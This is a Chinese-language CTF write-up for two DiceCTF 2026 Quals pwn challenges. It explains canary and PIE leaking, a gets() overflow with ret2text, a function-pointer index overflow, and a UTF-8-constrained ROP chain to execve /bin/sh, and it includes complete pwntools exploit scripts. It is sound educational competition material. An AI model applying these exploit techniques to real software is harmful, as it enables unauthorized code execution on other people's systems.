---
title: DiceCTF-2026-Quals 个人题解
date: 2026-03-10 13:29:00
tags: 
    - pwn
    - DiceCTF2026Quals
    - WriteUp
categories: Contest
---
## bytecrusher

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/checksec.png)

### code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void admin_portal() {
    puts("Welcome dicegang admin!");
    FILE *f = fopen("flag.txt", "r");
    if (f) {
        char read;
        while ((read = fgetc(f)) != EOF) {
            putchar(read);
        }
        fclose(f);
    } else {
        puts("flag file not found");
    }
}

void crush_string(char *input, char *output, int rate, int output_max_len) {
    if (rate < 1) rate = 1;
    int out_idx = 0;
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];
    }
    output[out_idx] = '\0';
}

void free_trial() {
    char input_buf[32];
    char crushed[32];

    for (int i=0; i<16; i++) {
        printf("Enter a string to crush:\n");
        fgets(input_buf, sizeof(input_buf), stdin);


        printf("Enter crush rate:\n");
        int rate;
        scanf("%d", &rate);

        if (rate < 1) {
            printf("Invalid crush rate, using default of 1.\n");
            rate = 1;
        }

        printf("Enter output length:\n");
        int output_len;
        scanf("%d", &output_len);

        if (output_len > sizeof(crushed)) {
            printf("Output length too large, using max size.\n");
            output_len = sizeof(crushed);
        }

        crush_string(input_buf, crushed, rate, output_len);


        printf("Crushed string:\n");
        puts(crushed);
    }
}

void get_feedback() {
    char buf[16];
    printf("Enter some text:\n");
    gets(buf);
    printf("Your feedback has been recorded and totally not thrown away.\n");
}


#define COMPILE_ADMIN_MODE 0

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("Welcome to ByteCrusher, dicegang's new proprietary text crusher!\n");
    printf("We are happy to offer sixteen free trials of our premium service.\n");

    free_trial();
    get_feedback();
    
    printf("\nThank you for trying ByteCrusher! We hope you enjoyed it.\n");

    if (COMPILE_ADMIN_MODE) {
        admin_portal();
    }
    
    return 0;
}
```

有越界写，通过选择合适的 rates 可以逐字节泄露 canary 和 pie ，毕竟至少有 16 字节的泄露机会

然后在栈溢出上 ret2text 即可

比较棘手的是本地打需要 Piggyback 技巧，但打远端不用

这比赛还有个神秘的 PoW ，爆破什么的不大现实

### IDA

#### free_trial

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/free_trial.png)

#### get_feedback

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/get_feedback.png)

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./bytecrusher_patched')
else:
	io = remote('bytecrusher.chals.dicec.tf', 1337)

canary_rates = [0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f]
pie_rates = [0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d]

libc = ELF('./libc.so.6')
	
def crush(rate, output_len):
	io.sendlineafter(b'crush:\n', b'A')
	io.sendlineafter(b'rate:\n', str(rate).encode())
	io.sendlineafter(b'length:\n', str(output_len).encode())

def attack():
	canary = b'\x00'
	for i in canary_rates:
		crush(i, 3)
		io.recvuntil(b"string:\nA")
		canary += io.recv(1)
	canary = u64(canary)
	log.info(f'canary = {hex(canary)}')

	pie = b''
	for i in pie_rates:
		crush(i, 3)
		io.recvuntil(b"string:\nA")
		pie += io.recv(1)
	pie = u64(pie.ljust(8, b'\x00')) - 0x15EC
	log.info(f'pie = {hex(pie)}')

	for _ in range(3):
		crush(1, 3)
	payload = b'A' * 0x18 + p64(canary) + p64(0) + p64(pie + 0x12AD)
	io.sendlineafter(b'text:\n', payload)

	io.interactive()

io.recvuntil(b"proof of work:\n")
pow_cmd = io.recvline().decode('utf-8').strip()
io.recvuntil(b"solution: ")
result = subprocess.check_output(pow_cmd, shell=True).decode('utf-8').strip()
io.sendline(result.encode())
attack()
```

## message-store

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/checksec.png)

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/main.png)

入口

#### set_message

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/set_message.png)

允许写入 BUFFER 

#### set_message_color

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/set_message_color.png)

设置 color

#### print_message

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/print_message.png)

没有校验 COLOR 的大小，存在数组越界写，可以执行函数指针，只要提前往 BUFFER 写入即可

需要注意 from_utf8_lossy

#### from_utf8_lossy

from_utf8_lossy 是 Rust 标准库中用于处理可能包含无效 UTF-8 序列的字节数据‌ 的方法，其核心特点是 ‌“有损但保证成功”‌

from_utf8_lossy ‌行为‌：
若字节序列是有效 UTF-8‌ ，直接借用为 &str ，不分配内存‌
若遇到无效 UTF-8 字节‌，用 Unicode 替换字符 ‌�（U+FFFD）替换，并返回一个‌新分配的 String‌

#### BUFFER

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/BUFFER1.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/BUFFER2.png)

### 攻击思路

利用数组越界写执行函数指针，由于 rax 在执行函数指针时为 from_utf8_lossy 的返回值，结合 `xchg rsp, rax; ret;` 可以去执行 BUFFER 上布置的 ROP 链，

但是这需要使 BUFFER 上布置的 ROP 链所使用的字节满足 UTF-8 规范：

```
1字节：
00–7F

2字节：
C2–DF 80–BF

3字节：
E0 A0–BF 80–BF
E1–EC 80–BF 80–BF
ED 80–9F 80–BF
EE–EF 80–BF 80–BF

4字节：
F0 90–BF 80–BF 80–BF
F1–F3 80–BF 80–BF 80–BF
F4 80–8F 80–BF 80–BF
```

然后去筛选 gadgets 打 ret2syscall

不过中间还需要布置 /bin/sh ，在 BUFFER 上布置然后传给 rdi 的地址不可能满足 1 字节 UTF-8 规范，但是可以满足 2 字节 UTF-8 规范： 0x2F9FD0 （小端序）

rust pwn 直接逆向比较困难，结合 动态分析 / fuzz 去推测漏洞点是很好的技巧

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./challenge')
else:
	io = remote('node5.buuoj.cn', 26980)

def send_message(meesage):
	io.sendlineafter(b'> ', b'1')
	io.sendlineafter(b'New Message? ', meesage)

def send_message_color(color):
	io.sendlineafter(b'> ', b'2')
	io.sendlineafter(b'> ', str(color).encode())

def print_message():
	io.sendlineafter(b'> ', b'3')

def myexit():
	io.sendlineafter(b'> ', b'4')

def attack():
	pop_rdi_pop_rbp_xor_eax_eax_ret = 0x2a1345
	pop_rsi_ret = 0x243431
	mov_rdx_rsi_add_rsp_0x80_pop_rbp_ret = 0x27146b
	mov_rax_rbx_pop_rbx_ret = 0x24577a
	syscall = 0x2a6602
	xchg_rsp_rax_ret = 0x242d78

	bin_sh = 0x2F9FD0
	buffer = 0x2F9E38
	funclist = 0x2F08E8

	rop_chain = flat([
		pop_rdi_pop_rbp_xor_eax_eax_ret,
		bin_sh,
		0,
		pop_rsi_ret,
		0,
		mov_rdx_rsi_add_rsp_0x80_pop_rbp_ret,
		p64(0) * 0x11,
		mov_rax_rbx_pop_rbx_ret,
		59,
		mov_rax_rbx_pop_rbx_ret,
		59,
		syscall,
		xchg_rsp_rax_ret
	])

	payload = flat({
		0x0: rop_chain,
		bin_sh - buffer: '/bin/sh\x00'
	}, filler = '\x00')

	send_message(payload)
	send_message_color((buffer + len(rop_chain) - 8 - funclist) // 8)
	gdb.attach(io)
	print_message()
	io.interactive()

attack()

# .data.rel.ro:00000000002F08E8 funcs_243A92    dq offset _RNvYReNtCscVAelyVn9lu_7colored8Colorize3redB6_
# .bss:00000000002F9E38 ; challenge::BUFFER

# 0x00000000002a1345: pop rdi; pop rbp; xor eax, eax; ret;
# 0x0000000000243431: pop rsi; ret;
# 0x000000000027146b: mov rdx, rsi; add rsp, 0x80; pop rbp; ret;
# 0x000000000024577a: mov rax, rbx; pop rbx; ret;
# 0x00000000002a6602: syscall;

# 0x0000000000242d78: xchg rsp, rax; ret;

# rdi->0x2F9FD0->/bin/sh\x00
# rsi->0
# rdx->0
```